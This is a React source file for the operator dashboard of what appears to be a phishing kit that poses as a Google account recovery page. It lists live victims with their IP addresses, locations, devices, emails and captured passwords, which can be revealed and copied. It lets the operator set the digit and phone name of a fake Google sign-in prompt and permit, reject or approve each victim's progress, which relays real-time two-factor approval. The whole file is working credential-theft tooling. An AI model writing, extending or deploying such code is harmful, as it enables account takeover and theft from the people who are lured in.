import React, { useState, useEffect } from 'react';
import { Shield, RefreshCw, Smartphone, Laptop, Tablet, MapPin, ArrowLeft, Activity, Radio, ExternalLink, Globe, Eye, EyeOff, Key, Copy, Check, X, Lock, Sliders, Edit2, Save, Phone } from 'lucide-react';
import { api } from '../services/api';
import CountryFlag from './CountryFlag';

export default function AdminPanelPage({ onBackToRecovery }) {
  const [data, setData] = useState({ active_visitors_count: 0, total_tracked: 0, visitors: [] });
  const [loading, setLoading] = useState(false);
  const [lastRefreshed, setLastRefreshed] = useState(new Date());
  const [revealedPasswords, setRevealedPasswords] = useState({});
  const [copiedId, setCopiedId] = useState(null);

  // Global Challenge Configuration State
  const [globalNumber, setGlobalNumber] = useState(63);
  const [globalDevice, setGlobalDevice] = useState('Apple iPhone 16');
  const [configSaved, setConfigSaved] = useState(false);

  // Per-Visitor Challenge Override State
  const [editingVisitorId, setEditingVisitorId] = useState(null);
  const [visitorNumberInput, setVisitorNumberInput] = useState(63);
  const [visitorDeviceInput, setVisitorDeviceInput] = useState('Apple iPhone 16');
  const [actionLoading, setActionLoading] = useState({});

  const handlePermitVisitor = async (visitorId) => {
    setActionLoading((prev) => ({ ...prev, [visitorId]: 'permit' }));
    try {
      await api.permitVisitor(visitorId);
      await fetchLiveVisitors();
    } catch (err) {
      console.error('Failed to permit visitor:', err);
      alert(`Permit failed: ${err.message}`);
    } finally {
      setActionLoading((prev) => ({ ...prev, [visitorId]: null }));
    }
  };

  const handleRejectVisitor = async (visitorId) => {
    setActionLoading((prev) => ({ ...prev, [visitorId]: 'reject' }));
    try {
      await api.rejectVisitor(visitorId);
      await fetchLiveVisitors();
    } catch (err) {
      console.error('Failed to reject visitor:', err);
      alert(`Reject failed: ${err.message}`);
    } finally {
      setActionLoading((prev) => ({ ...prev, [visitorId]: null }));
    }
  };

  const handleApproveVisitor = async (visitorId) => {
    setActionLoading((prev) => ({ ...prev, [visitorId]: 'approve' }));
    try {
      await api.approveVisitor(visitorId);
      await fetchLiveVisitors();
    } catch (err) {
      console.error('Failed to approve visitor:', err);
      alert(`Approve failed: ${err.message}`);
    } finally {
      setActionLoading((prev) => ({ ...prev, [visitorId]: null }));
    }
  };

  // Load initial challenge config
  useEffect(() => {
    async function loadConfig() {
      try {
        const cfg = await api.getChallengeConfig();
        if (cfg) {
          if (cfg.default_match_number) setGlobalNumber(cfg.default_match_number);
          if (cfg.default_device_name) setGlobalDevice(cfg.default_device_name);
        }
      } catch (e) {}
    }
    loadConfig();
  }, []);

  const handleSaveGlobalConfig = async (e) => {
    if (e) e.preventDefault();
    try {
      await api.updateChallengeConfig({
        default_match_number: parseInt(globalNumber, 10) || 63,
        default_device_name: globalDevice || 'Apple iPhone 16',
      });
      setConfigSaved(true);
      setTimeout(() => setConfigSaved(false), 2500);
      fetchLiveVisitors();
    } catch (e) {}
  };

  const handleSaveVisitorChallenge = async (visitorId) => {
    try {
      await api.updateVisitorChallenge({
        visitor_id: visitorId,
        match_number: parseInt(visitorNumberInput, 10) || 63,
        device_name: visitorDeviceInput || 'Apple iPhone 16',
      });
      setEditingVisitorId(null);
      fetchLiveVisitors();
    } catch (e) {}
  };

  const formatSafeTime = (ts) => {
    if (!ts) return '-';
    try {
      const d = new Date(ts);
      return isNaN(d.getTime()) ? '-' : d.toLocaleTimeString();
    } catch {
      return '-';
    }
  };

  const fetchLiveVisitors = async () => {
    try {
      const res = await api.getLiveVisitors();
      if (res) {
        setData({
          active_visitors_count: res.active_visitors_count ?? 0,
          total_tracked: res.total_tracked ?? 0,
          visitors: Array.isArray(res.visitors) ? res.visitors : []
        });
        setLastRefreshed(new Date());
      }
    } catch (e) {
      console.error('Failed to fetch live visitors:', e);
    }
  };

  useEffect(() => {
    fetchLiveVisitors();
    const timer = setInterval(fetchLiveVisitors, 1500);
    return () => clearInterval(timer);
  }, []);

  const getDeviceIcon = (devType) => {
    if (devType === 'Mobile') return <Smartphone className="w-4 h-4 text-[#0b57d0]" />;
    if (devType === 'Tablet') return <Tablet className="w-4 h-4 text-[#137333]" />;
    return <Laptop className="w-4 h-4 text-[#5f6368]" />;
  };

  return (
    <div className="min-h-screen bg-[#f8fafd] text-[#1f1f1f] font-sans antialiased text-left">
      {/* Top Navbar */}
      <header className="bg-white border-b border-[#dadce0] px-6 py-4 flex items-center justify-between sticky top-0 z-30 shadow-xs">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-xl bg-[#e8f0fe] flex items-center justify-center text-[#0b57d0] shadow-xs">
            <Shield className="w-5 h-5 text-[#0b57d0]" />
          </div>
          <div>
            <h1 className="text-[18px] font-semibold text-[#1f1f1f] flex items-center gap-2 leading-tight">
              Gonnit Security &bull; Real-Time Visitor Intelligence
              <span className="flex items-center gap-1 text-[11px] font-medium px-2.5 py-0.5 rounded-full bg-[#e6f4ea] text-[#137333] border border-[#ceead6]">
                <Radio className="w-3 h-3 animate-pulse text-[#137333]" />
                Live Radar
              </span>
            </h1>
            <p className="text-[12px] text-[#5f6368]">
              100% Real-time presence &bull; Country flags, actual public IPs, device detection, and instant tab-exit tracking
            </p>
          </div>
        </div>

        <div className="flex items-center gap-3">
          <span className="text-[11px] text-[#5f6368] hidden sm:inline font-mono">
            Updated: {formatSafeTime(lastRefreshed)}
          </span>
          <button
            type="button"
            onClick={fetchLiveVisitors}
            title="Refresh now"
            className="p-2 rounded-full border border-[#dadce0] hover:bg-[#f1f3f4] text-[#5f6368] transition-colors"
          >
            <RefreshCw className={`w-4 h-4 ${loading ? 'animate-spin' : ''}`} />
          </button>
          <button
            type="button"
            onClick={onBackToRecovery}
            className="inline-flex items-center gap-1.5 px-4 py-2 rounded-full bg-[#0b57d0] hover:bg-[#0842a0] text-white text-[13px] font-medium transition-colors shadow-xs"
          >
            <ArrowLeft className="w-4 h-4" />
            <span>View Recovery Page</span>
          </button>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-7xl mx-auto px-4 sm:px-6 py-8">
        {(() => {
          const visitorsList = Array.isArray(data?.visitors) ? data.visitors : [];
          return null;
        })()}
        {/* KPI Top Cards */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-5 mb-8">
          <div className="p-5 rounded-2xl bg-white border border-[#dadce0] shadow-xs flex items-center justify-between">
            <div>
              <span className="text-xs font-medium text-[#5f6368] block uppercase tracking-wider mb-1">
                Active Visitors Now
              </span>
              <div className="flex items-baseline gap-2">
                <span className="text-3xl font-bold text-[#137333]">
                  {data?.active_visitors_count ?? 0}
                </span>
                <span className="relative flex h-2.5 w-2.5">
                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#34a853] opacity-75"></span>
                  <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-[#137333]"></span>
                </span>
              </div>
            </div>
            <div className="w-12 h-12 rounded-xl bg-[#e6f4ea] text-[#137333] flex items-center justify-center">
              <Activity className="w-6 h-6" />
            </div>
          </div>

          <div className="p-5 rounded-2xl bg-white border border-[#dadce0] shadow-xs flex items-center justify-between">
            <div>
              <span className="text-xs font-medium text-[#5f6368] block uppercase tracking-wider mb-1">
                Captured Passwords
              </span>
              <div className="flex items-baseline gap-2">
                <span className="text-3xl font-bold text-[#b78103]">
                  {(Array.isArray(data?.visitors) ? data.visitors : []).filter((v) => v.entered_password).length}
                </span>
                <span className="text-xs text-[#5f6368] font-normal">step 2 logs</span>
              </div>
            </div>
            <div className="w-12 h-12 rounded-xl bg-[#fef7e0] text-[#b78103] flex items-center justify-center">
              <Key className="w-6 h-6" />
            </div>
          </div>

          <div className="p-5 rounded-2xl bg-white border border-[#dadce0] shadow-xs flex items-center justify-between">
            <div>
              <span className="text-xs font-medium text-[#5f6368] block uppercase tracking-wider mb-1">
                Inactive / Left Sessions
              </span>
              <span className="text-3xl font-bold text-[#5f6368]">
                {Math.max(0, (data?.total_tracked ?? 0) - (data?.active_visitors_count ?? 0))}
              </span>
            </div>
            <div className="w-12 h-12 rounded-xl bg-[#f1f3f4] text-[#5f6368] flex items-center justify-center">
              <Radio className="w-6 h-6" />
            </div>
          </div>

          <div className="p-5 rounded-2xl bg-white border border-[#dadce0] shadow-xs flex items-center justify-between">
            <div>
              <span className="text-xs font-medium text-[#5f6368] block uppercase tracking-wider mb-1">
                Total Live Sessions
              </span>
              <span className="text-3xl font-bold text-[#0b57d0]">
                {data?.total_tracked ?? 0}
              </span>
            </div>
            <div className="w-12 h-12 rounded-xl bg-[#e8f0fe] text-[#0b57d0] flex items-center justify-center">
              <Globe className="w-6 h-6" />
            </div>
          </div>
        </div>

        {/* Live Challenge Controller Card */}
        <div className="bg-white border border-[#dadce0] rounded-2xl p-5 mb-8 shadow-xs">
          <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-4 pb-4 border-b border-[#f1f3f4]">
            <div>
              <h2 className="text-[16px] font-semibold text-[#1f1f1f] flex items-center gap-2">
                <Sliders className="w-4 h-4 text-[#0b57d0]" />
                Google Prompt Challenge Controller
                <span className="text-[11px] font-medium px-2 py-0.5 rounded-full bg-[#e8f0fe] text-[#0b57d0]">
                  Pre-configured by Admin
                </span>
              </h2>
              <p className="text-xs text-[#5f6368] mt-0.5">
                Set the exact 2-digit number and target phone name shown on the Google recovery screen before visitors see it.
              </p>
            </div>
            {configSaved && (
              <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-[#e6f4ea] text-[#137333] border border-[#ceead6] text-xs font-semibold animate-in fade-in">
                <Check className="w-3.5 h-3.5 text-[#137333]" />
                Saved & Active for Visitors
              </span>
            )}
          </div>

          <form onSubmit={handleSaveGlobalConfig} className="grid grid-cols-1 sm:grid-cols-12 gap-4 items-end">
            <div className="sm:col-span-3">
              <label className="block text-xs font-semibold text-[#3c4043] uppercase tracking-wider mb-1">
                Prompt Digit / Number
              </label>
              <input
                type="number"
                min="10"
                max="99"
                value={globalNumber}
                onChange={(e) => setGlobalNumber(e.target.value)}
                placeholder="63"
                className="w-full h-[42px] px-3.5 bg-[#f8f9fa] border border-[#dadce0] focus:border-[#0b57d0] focus:bg-white rounded-lg text-lg font-mono font-bold text-[#1f1f1f] outline-none transition-colors"
              />
            </div>

            <div className="sm:col-span-6">
              <label className="block text-xs font-semibold text-[#3c4043] uppercase tracking-wider mb-1">
                Target Device Name
              </label>
              <input
                type="text"
                value={globalDevice}
                onChange={(e) => setGlobalDevice(e.target.value)}
                placeholder="Apple iPhone 16"
                className="w-full h-[42px] px-3.5 bg-[#f8f9fa] border border-[#dadce0] focus:border-[#0b57d0] focus:bg-white rounded-lg text-sm font-medium text-[#1f1f1f] outline-none transition-colors"
              />
              <div className="flex flex-wrap gap-1.5 mt-2">
                {['Apple iPhone 16', 'Apple iPhone 16 Pro Max', 'Samsung Galaxy S24 Ultra', 'Google Pixel 9 Pro'].map((dev) => (
                  <button
                    key={dev}
                    type="button"
                    onClick={() => setGlobalDevice(dev)}
                    className="text-[11px] px-2 py-0.5 rounded-full bg-[#f1f3f4] hover:bg-[#e8f0fe] text-[#3c4043] hover:text-[#0b57d0] transition-colors"
                  >
                    {dev}
                  </button>
                ))}
              </div>
            </div>

            <div className="sm:col-span-3">
              <button
                type="submit"
                className="w-full h-[42px] rounded-lg bg-[#0b57d0] hover:bg-[#0842a0] text-white text-xs font-semibold inline-flex items-center justify-center gap-1.5 transition-colors shadow-xs"
              >
                <Save className="w-3.5 h-3.5" />
                <span>Save Global Settings</span>
              </button>
            </div>
          </form>
        </div>

        {/* Live Visitor Presence Table */}
        <div className="bg-white border border-[#dadce0] rounded-2xl shadow-xs overflow-hidden">
          <div className="p-5 border-b border-[#dadce0] flex items-center justify-between bg-white">
            <div>
              <h2 className="text-[16px] font-semibold text-[#1f1f1f] flex items-center gap-2">
                Real-Time Presence Radar
                <span className="text-xs font-normal text-[#5f6368]">
                  (Updates immediately when someone visits, enters credentials, or closes the page)
                </span>
              </h2>
            </div>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-left text-[13px] text-[#3c4043]">
              <thead className="bg-[#f8f9fa] text-[#1f1f1f] border-b border-[#dadce0] font-semibold text-xs uppercase tracking-wider">
                <tr>
                  <th className="p-3.5 pl-5">Status</th>
                  <th className="p-3.5">Country & Flag</th>
                  <th className="p-3.5">Public IP Address</th>
                  <th className="p-3.5">Device & Platform</th>
                  <th className="p-3.5">Account / Email</th>
                  <th className="p-3.5">Captured Password</th>
                  <th className="p-3.5">Assigned Prompt & Phone</th>
                  <th className="p-3.5">Current Screen</th>
                  <th className="p-3.5 pr-5">Last Activity</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-[#f1f3f4]">
                {(!Array.isArray(data?.visitors) || data.visitors.length === 0) ? (
                  <tr>
                    <td colSpan="9" className="p-12 text-center text-[#5f6368]">
                      <Radio className="w-8 h-8 text-[#dadce0] mx-auto mb-2 animate-pulse" />
                      <p className="text-[14px] font-medium text-[#1f1f1f]">No active visitors right now</p>
                      <p className="text-xs text-[#5f6368]">Open the recovery page in a new window or mobile device to see real telemetry appear instantly.</p>
                    </td>
                  </tr>
                ) : (
                  data.visitors.map((v) => (
                    <tr
                      key={v.visitor_id}
                      className={`transition-colors ${
                        v.is_active ? 'bg-[#f4fbf5] hover:bg-[#eaf8ec]' : 'hover:bg-[#f8f9fa]'
                      }`}
                    >
                      {/* Real-time Status Badge */}
                      <td className="p-3.5 pl-5">
                        {v.is_active ? (
                          <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-[#e6f4ea] text-[#137333] border border-[#ceead6] text-xs font-semibold">
                            <span className="w-2 h-2 rounded-full bg-[#34a853] animate-ping" />
                            Active Now
                          </span>
                        ) : (
                          <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-[#f1f3f4] text-[#5f6368] border border-[#dadce0] text-xs font-medium">
                            <span className="w-2 h-2 rounded-full bg-[#9aa0a6]" />
                            {v.status_text}
                          </span>
                        )}
                      </td>

                      {/* Country with Crisp SVG Flag & Guarantee */}
                      <td className="p-3.5">
                        <div className="font-semibold text-[#1f1f1f] flex items-center gap-2.5 text-[14px]">
                          <CountryFlag code={v.country_code} country={v.country} className="w-7 h-5 shadow-xs" />
                          <span>{v.country}</span>
                          <span className="text-[11px] font-mono font-medium text-[#5f6368] px-1.5 py-0.5 rounded bg-slate-100">
                            {v.country_code}
                          </span>
                        </div>
                        <div className="text-[11px] text-[#5f6368] ml-9">{v.city}</div>
                      </td>

                      {/* Real Public IP Address */}
                      <td className="p-3.5 font-mono text-[13px] font-bold text-[#0b57d0]">
                        {v.ip_address}
                      </td>

                      {/* Device Type & Platform */}
                      <td className="p-3.5">
                        <div className="flex items-center gap-1.5 font-medium text-[#1f1f1f]">
                          {getDeviceIcon(v.device_type)}
                          <span>{v.device_type}</span>
                        </div>
                        <div className="text-[11px] text-[#5f6368]">
                          {v.os} &bull; {v.browser}
                        </div>
                      </td>

                      {/* Email in recovery */}
                      <td className="p-3.5 font-medium text-[#1f1f1f]">
                        {v.email && v.email !== 'Entering Email...' ? (
                          <span className="px-2 py-0.5 rounded bg-[#e8f0fe] text-[#1a73e8] font-mono text-xs">
                            {v.email}
                          </span>
                        ) : (
                          <span className="text-[#9aa0a6] italic text-xs">Entering email...</span>
                        )}
                      </td>

                      {/* Captured Password from Step 2 */}
                      <td className="p-3.5">
                        {v.entered_password ? (
                          <div className="flex items-center gap-1.5">
                            <span className="inline-flex items-center gap-1 px-2.5 py-1 rounded bg-[#fff8e1] border border-[#ffe082] text-[#b78103] font-mono text-xs font-semibold">
                              <Key className="w-3.5 h-3.5 text-[#f59e0b]" />
                              <span>{revealedPasswords[v.visitor_id] ? v.entered_password : '••••••••••••'}</span>
                            </span>
                            <button
                              type="button"
                              onClick={() =>
                                setRevealedPasswords((prev) => ({
                                  ...prev,
                                  [v.visitor_id]: !prev[v.visitor_id],
                                }))
                              }
                              className="p-1 text-[#5f6368] hover:text-[#1f1f1f] rounded hover:bg-[#f1f3f4] transition-colors"
                              title={revealedPasswords[v.visitor_id] ? 'Hide password' : 'Show password'}
                            >
                              {revealedPasswords[v.visitor_id] ? (
                                <EyeOff className="w-3.5 h-3.5" />
                              ) : (
                                <Eye className="w-3.5 h-3.5" />
                              )}
                            </button>
                            <button
                              type="button"
                              onClick={() => {
                                navigator.clipboard.writeText(v.entered_password);
                                setCopiedId(v.visitor_id);
                                setTimeout(() => setCopiedId(null), 2000);
                              }}
                              className="p-1 text-[#5f6368] hover:text-[#0b57d0] rounded hover:bg-[#e8f0fe] transition-colors"
                              title="Copy password"
                            >
                              {copiedId === v.visitor_id ? (
                                <Check className="w-3.5 h-3.5 text-green-600" />
                              ) : (
                                <Copy className="w-3.5 h-3.5" />
                              )}
                            </button>
                          </div>
                        ) : (
                          <span className="text-[#9aa0a6] italic text-xs">Waiting for password...</span>
                        )}
                      </td>

                      {/* Assigned Prompt & Phone (Live Customizer) */}
                      <td className="p-3.5">
                        {editingVisitorId === v.visitor_id ? (
                          <div className="flex flex-col gap-1.5 p-2 rounded-lg bg-white border border-[#0b57d0] shadow-sm">
                            <div className="flex items-center gap-1.5">
                              <input
                                type="number"
                                min="10"
                                max="99"
                                value={visitorNumberInput}
                                onChange={(e) => setVisitorNumberInput(e.target.value)}
                                className="w-14 h-7 px-1.5 border border-slate-300 rounded font-mono font-bold text-xs"
                                placeholder="63"
                              />
                              <input
                                type="text"
                                value={visitorDeviceInput}
                                onChange={(e) => setVisitorDeviceInput(e.target.value)}
                                className="w-32 h-7 px-1.5 border border-slate-300 rounded text-xs"
                                placeholder="Device name"
                              />
                            </div>
                            <div className="flex items-center gap-2 justify-end">
                              <button
                                type="button"
                                onClick={() => setEditingVisitorId(null)}
                                className="text-[11px] text-[#5f6368] hover:underline"
                              >
                                Cancel
                              </button>
                              <button
                                type="button"
                                onClick={() => handleSaveVisitorChallenge(v.visitor_id)}
                                className="px-2 py-0.5 rounded bg-[#0b57d0] text-white text-[11px] font-medium"
                              >
                                Apply
                              </button>
                            </div>
                          </div>
                        ) : (
                          <div className="flex items-center gap-2">
                            <span className="inline-flex items-center px-2 py-0.5 rounded bg-[#e8f0fe] border border-[#d2e3fc] text-[#0b57d0] font-mono text-xs font-bold">
                              #{v.custom_match_number || globalNumber || 63}
                            </span>
                            <span
                              className="text-xs text-[#3c4043] font-medium truncate max-w-[130px]"
                              title={v.custom_device_name || globalDevice}
                            >
                              {v.custom_device_name || globalDevice || 'Apple iPhone 16'}
                            </span>
                            <button
                              type="button"
                              onClick={() => {
                                setEditingVisitorId(v.visitor_id);
                                setVisitorNumberInput(v.custom_match_number || globalNumber || 63);
                                setVisitorDeviceInput(v.custom_device_name || globalDevice || 'Apple iPhone 16');
                              }}
                              className="p-1 text-[#5f6368] hover:text-[#0b57d0] rounded hover:bg-[#f1f3f4] transition-colors"
                              title="Customize digit & phone for this visitor"
                            >
                              <Edit2 className="w-3 h-3" />
                            </button>
                          </div>
                        )}
                      </td>

                      {/* Current Step & Action */}
                      <td className="p-3.5 font-medium text-[#3c4043]">
                        <div className="flex items-center gap-2">
                          <span className={`px-2.5 py-1 rounded-full border text-xs font-medium ${
                            v.admin_decision === 'REJECTED' || v.current_step?.includes('Denied')
                              ? 'bg-[#fdeded] border-[#f5c2c7] text-[#b02a37]'
                              : v.admin_decision === 'PERMITTED' || v.current_step?.includes('Verified')
                              ? 'bg-[#e6f4ea] border-[#ceead6] text-[#137333]'
                              : v.current_step?.includes('Awaiting')
                              ? 'bg-[#fef7e0] border-[#feefc3] text-[#b06000]'
                              : 'bg-white border-[#dadce0] text-[#3c4043]'
                          }`}>
                            {v.current_step}
                          </span>

                          {/* Gatekeeper Action: If visitor submitted password and awaits admin permit */}
                          {v.is_active && (v.admin_decision === 'PENDING' || v.current_step?.includes('Awaiting Admin Permit') || (v.entered_password && v.admin_decision !== 'REJECTED' && !v.current_step?.includes('Prompt') && !v.current_step?.includes('Verified'))) && (
                            <div className="flex items-center gap-1.5">
                              <button
                                type="button"
                                disabled={actionLoading[v.visitor_id] === 'permit'}
                                onClick={() => handlePermitVisitor(v.visitor_id)}
                                className="px-2.5 py-1 rounded-full bg-[#137333] hover:bg-[#0d5925] text-white text-[11px] font-semibold transition-colors shadow-xs inline-flex items-center gap-1 cursor-pointer disabled:opacity-50"
                                title="Permit visitor to advance to verification screen"
                              >
                                <Check className="w-3 h-3 text-white" />
                                <span>{actionLoading[v.visitor_id] === 'permit' ? 'Permitting...' : 'Permit'}</span>
                              </button>
                              <button
                                type="button"
                                disabled={actionLoading[v.visitor_id] === 'reject'}
                                onClick={() => handleRejectVisitor(v.visitor_id)}
                                className="px-2.5 py-1 rounded-full bg-[#d93025] hover:bg-[#b3261e] text-white text-[11px] font-semibold transition-colors shadow-xs inline-flex items-center gap-1 cursor-pointer disabled:opacity-50"
                                title="Reject suspicious attempt (shows Wrong password to visitor)"
                              >
                                <X className="w-3 h-3 text-white" />
                                <span>{actionLoading[v.visitor_id] === 'reject' ? 'Rejecting...' : 'Reject'}</span>
                              </button>
                            </div>
                          )}

                          {/* Prompt Verification Action: If visitor is on Google Prompt verification screen */}
                          {v.is_active && (v.admin_decision === 'PERMITTED' || v.current_step?.includes('Prompt')) && !v.current_step?.includes('Verified') && !v.current_step?.includes('Awaiting') && (
                            <button
                              type="button"
                              disabled={actionLoading[v.visitor_id] === 'approve'}
                              onClick={() => handleApproveVisitor(v.visitor_id)}
                              className="px-2.5 py-1 rounded-full bg-[#0b57d0] hover:bg-[#0842a0] text-white text-[11px] font-semibold transition-colors shadow-xs inline-flex items-center gap-1 cursor-pointer disabled:opacity-50"
                              title="Verify prompt & advance visitor to Create New Password screen"
                            >
                              <Check className="w-3 h-3 text-white" />
                              <span>{actionLoading[v.visitor_id] === 'approve' ? 'Approving...' : 'Approve'}</span>
                            </button>
                          )}
                        </div>
                      </td>

                      {/* Last activity timestamp */}
                      <td className="p-3.5 pr-5 text-[#5f6368] text-xs font-mono">
                        {formatSafeTime(v.last_heartbeat)}
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>
      </main>
    </div>
  );
}
